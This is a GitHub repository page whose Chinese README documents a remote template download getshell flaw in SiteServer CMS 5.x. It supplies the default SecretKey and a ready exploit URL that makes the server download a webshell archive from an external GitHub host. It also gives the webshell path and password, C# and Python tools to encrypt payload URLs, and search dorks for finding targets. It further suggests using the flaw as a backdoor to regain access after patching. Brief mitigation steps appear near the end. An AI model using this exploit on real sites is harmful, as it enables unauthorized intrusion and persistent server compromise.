
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=we1h0%2FSiteServer-CMS-Remote-download-Getshell)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[we1h0](/we1h0)
/
**[SiteServer-CMS-Remote-download-Getshell](/we1h0/SiteServer-CMS-Remote-download-Getshell)**
Public

* [Notifications](/login?return_to=%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell) You must be signed in to change notification settings
* [Fork
  24](/login?return_to=%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell)
* [Star
   69](/login?return_to=%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell)

SiteServer CMS 5.x远程模板下载Getshell漏洞

[69
stars](/we1h0/SiteServer-CMS-Remote-download-Getshell/stargazers) [24
forks](/we1h0/SiteServer-CMS-Remote-download-Getshell/forks) [Branches](/we1h0/SiteServer-CMS-Remote-download-Getshell/branches) [Tags](/we1h0/SiteServer-CMS-Remote-download-Getshell/tags) [Activity](/we1h0/SiteServer-CMS-Remote-download-Getshell/activity)
 [Star](/login?return_to=%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell)

 [Notifications](/login?return_to=%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell) You must be signed in to change notification settings

* [Code](/we1h0/SiteServer-CMS-Remote-download-Getshell)
* [Pull requests
  0](/we1h0/SiteServer-CMS-Remote-download-Getshell/pulls)
* [Actions](/we1h0/SiteServer-CMS-Remote-download-Getshell/actions)
* [Security](/we1h0/SiteServer-CMS-Remote-download-Getshell/security)
* [Insights](/we1h0/SiteServer-CMS-Remote-download-Getshell/pulse)

Additional navigation options

* [Code](/we1h0/SiteServer-CMS-Remote-download-Getshell)
* [Pull requests](/we1h0/SiteServer-CMS-Remote-download-Getshell/pulls)
* [Actions](/we1h0/SiteServer-CMS-Remote-download-Getshell/actions)
* [Security](/we1h0/SiteServer-CMS-Remote-download-Getshell/security)
* [Insights](/we1h0/SiteServer-CMS-Remote-download-Getshell/pulse)

# we1h0/SiteServer-CMS-Remote-download-Getshell

    master[Branches](/we1h0/SiteServer-CMS-Remote-download-Getshell/branches)[Tags](/we1h0/SiteServer-CMS-Remote-download-Getshell/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[41 Commits](/we1h0/SiteServer-CMS-Remote-download-Getshell/commits/master/) | | |
| [img](/we1h0/SiteServer-CMS-Remote-download-Getshell/tree/master/img "img") | | [img](/we1h0/SiteServer-CMS-Remote-download-Getshell/tree/master/img "img") |  |  |
| [webshell](/we1h0/SiteServer-CMS-Remote-download-Getshell/tree/master/webshell "webshell") | | [webshell](/we1h0/SiteServer-CMS-Remote-download-Getshell/tree/master/webshell "webshell") |  |  |
| [README.md](/we1h0/SiteServer-CMS-Remote-download-Getshell/blob/master/README.md "README.md") | | [README.md](/we1h0/SiteServer-CMS-Remote-download-Getshell/blob/master/README.md "README.md") |  |  |
| [poc.py](/we1h0/SiteServer-CMS-Remote-download-Getshell/blob/master/poc.py "poc.py") | | [poc.py](/we1h0/SiteServer-CMS-Remote-download-Getshell/blob/master/poc.py "poc.py") |  |  |
| View all files | | |

## Repository files navigation

* README
## SiteServer-CMS-Remote-download-Getshell-vulnerability

SiteServer CMS 远程模板下载Getshell漏洞

[![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/598750731.jpg)](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/598750731.jpg)

漏洞缺陷是由于后台模板下载位置未对用户权限进行校验，且 ajaxOtherService中的downloadUrl参数可控，导致getshell，目前经过测试发现对5.0版本包含5.0以下通杀.先调用了DecryptStringBySecretKey函数将downloadurl先进行了解密，之后调用SiteTemplateDownload函数进行模板下载并自解压。

且SecretKey在5.0是默认值

> vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5

### References

Author:1u0hun

[简记野生应急捕获到的siteserver远程模板下载Getshell漏洞](https://www.freebuf.com/articles/web/195105.html)

### Affected Version

SiteServerCMS 6.x（需要且SecretKey.Tips:查看web.config获取SecretKey，因为6.x的密钥是随机生成的，这里可以用作维持权限后门使用，即通过其他手段进去了，但管理员根据日志找到你进去的漏洞，修复后，可以再次通过此漏洞获取Webshell.或者你有其他办法能把SecretKey的值读取出来也可以组合使用.突然间关注这漏洞的人多了,这行属于另外再添加的.2020/02/26.）

SiteServerCMS 5.x

SiteServerCMS 4.x(测试没通过)

### PoC

Author:We1h0@PoxTeam

> <http://localhost/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest>

```
python2 poc.py -u http://localhost

```

[![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/494367940.jpg)](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/494367940.jpg)

```
python2 poc.py -f url.txt

```

Ps:注意最后面没/

WebShell:<http://localhost/SiteFiles/SiteTemplates/sectest/include.aspx>

PassWord:admin

### 搜索引擎关键字:

inurl:/sitefiles/services

inurl:/siteserver/login.aspx

### 临时修复方案

修改

> 1.修改C:/WebSite/SiteFiles/Configuration/Configuration.config文件里secretKey的值

> 2.然后修改根目录web.config下的DatabaseType/ConnectionString值都是通过下面的加密工具进行加密的字符串.

> 3.更改后台地址

> 4.更改(或移除模板下载功能)/SiteServer/Ajax/ajaxOtherService.aspx路径

### downloadUrl加密工具

#### C#

[VSCODE配置C#](https://blog.csdn.net/qq_40346899/article/details/80955788)

`dotnet new console -o test`

`dotnet run`
生成目录后的Program.cs替换以下代码

1.然后修改\_inputString的值(你指定的下载地址)

```
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
namespace EncryptApplication
{ class Encrypt
    { static void Main(string[] args)
      {
        var _encryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        var _decryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        var _inputString = "https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/webshell/poxteam.zip";
        var _outString = ""; var _noteMessage = "";
        byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
        try{
           var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length > 8 ? _encryptKey.Substring(0, 8) : _encryptKey);
          var des = new DESCryptoServiceProvider();
          var inputByteArray = Encoding.UTF8.GetBytes(_inputString);
          var ms = new MemoryStream();
          var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write);     cs.Write(inputByteArray, 0, inputByteArray.Length);
         cs.FlushFinalBlock();
          _outString = Convert.ToBase64String(ms.ToArray());
         Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString); }
      catch (Exception error) { _noteMessage = error.Message; }
 } } }
```

[![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/545223712.jpg)](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/545223712.jpg)

2.把出来的结果丢这里

Python

```
str_decry = "aZlBAFKTavCnFX10p8sNYfr9FRNHM/XP8EW1kEnDr4pNGA7T2XSz0yCY+MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ+gNU9tDxOqBwAd37smw=="
str_decry = str_decry.replace("+", "0add0").replace("=", "0equals0").replace("&", "0and0").replace("?", "0question0").replace("/", "0slash0")

print str_decry
```

[![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/1853999564.jpg)](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/1853999564.jpg)

得出转义后的下载链接，修改Poc.py

`/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=这里&directoryName=sectest`

### downloadUrl解密工具

(也可以用来解web.config的数据库链接信息,密钥不变的情况下,如果密钥变了找SiteFiles/Configuration/Configuration.config的secretKey的值)

1.先用python的还原

```
str_decry = "aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0"
str_decry = str_decry.replace("0add0", "+").replace("0equals0", "=").replace("0and0", "&").replace("0question0", "?").replace("0slash0", "/")

print str_decry
```

[![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/1213922991.jpg)](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/1213922991.jpg)

2.再用c#以下的代码还原回默认下载链接

```
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
namespace EncryptApplication
{ class Encrypt
    { static void Main(string[] args)
      {
        var _encryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        var _decryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        var _inputString = "aZlBAFKTavCnFX10p8sNYfr9FRNHM/XP8EW1kEnDr4pNGA7T2XSz0yCY+MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ+gNU9tDxOqBwAd37smw==";
        var _outString = "";
        var _noteMessage = "";
        byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
        try
        {
          var byKey = Encoding.UTF8.GetBytes(_decryptKey.Substring(0, 8));
          var des = new DESCryptoServiceProvider();
          var inputByteArray = Convert.FromBase64String(_inputString);
          var ms = new MemoryStream();
          var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write);
              cs.Write(inputByteArray, 0, inputByteArray.Length);
              cs.FlushFinalBlock();
          Encoding encoding = new UTF8Encoding();
          _outString = encoding.GetString(ms.ToArray());
         Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString); }
      catch (Exception error) { _noteMessage = error.Message; }
 } } }

```

[![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/1818119636.jpg)](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/1818119636.jpg)

## About

SiteServer CMS 5.x远程模板下载Getshell漏洞

### Resources

[Readme](#readme-ov-file)

[Activity](/we1h0/SiteServer-CMS-Remote-download-Getshell/activity)
### Stars

[**69**
stars](/we1h0/SiteServer-CMS-Remote-download-Getshell/stargazers)
### Watchers

[**2**
watching](/we1h0/SiteServer-CMS-Remote-download-Getshell/watchers)
### Forks

[**24**
forks](/we1h0/SiteServer-CMS-Remote-download-Getshell/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fwe1h0%2FSiteServer-CMS-Remote-download-Getshell&report=we1h0+%28user%29)

## [Releases](/we1h0/SiteServer-CMS-Remote-download-Getshell/releases)

No releases published

## [Packages 0](/users/we1h0/packages?repo_name=SiteServer-CMS-Remote-download-Getshell)

No packages published

## Languages

* [Python
  100.0%](/we1h0/SiteServer-CMS-Remote-download-Getshell/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

